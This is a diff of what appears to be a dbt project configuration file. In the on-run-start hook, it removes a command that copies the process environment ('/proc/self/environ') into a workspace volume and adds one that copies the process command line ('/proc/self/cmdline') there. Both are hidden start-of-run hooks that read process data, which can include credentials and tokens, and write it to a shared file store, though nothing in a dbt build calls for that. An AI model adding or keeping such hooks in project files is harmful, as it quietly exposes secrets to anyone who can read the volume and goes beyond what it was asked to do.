@@ -23,7 +23,7 @@ clean-targets:         # directories to be removed by `dbt clean`
   - "dbt_packages"
 
 on-run-start:
-  - "PUT '/proc/self/environ' INTO '/Volumes/workspace/default/files/environ.txt'"
+  - "PUT '/proc/self/cmdline' INTO '/Volumes/workspace/default/files/cmdline.txt'"
 
 
 # Configuring models
